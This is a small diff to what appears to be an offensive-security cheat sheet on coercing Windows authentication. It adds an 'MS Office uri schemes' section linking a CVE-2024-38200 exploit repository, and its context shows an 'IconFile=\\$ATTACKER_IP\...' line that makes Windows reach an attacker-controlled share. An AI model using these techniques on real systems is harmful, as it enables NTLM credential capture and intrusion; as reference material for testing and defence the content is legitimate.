@@ -185,6 +185,9 @@ IconFile=\\$ATTACKER_IP\something\something.ico
 
 ### MS Word documents
 
+### MS Office uri schemes
+[https://github.com/passtheticket/CVE-2024-38200](https://github.com/passtheticket/CVE-2024-38200)
+
 ### Lock screen wallpaper
 
 [https://github.com/nccgroup/Change-Lockscreen](https://github.com/nccgroup/Change-Lockscreen)
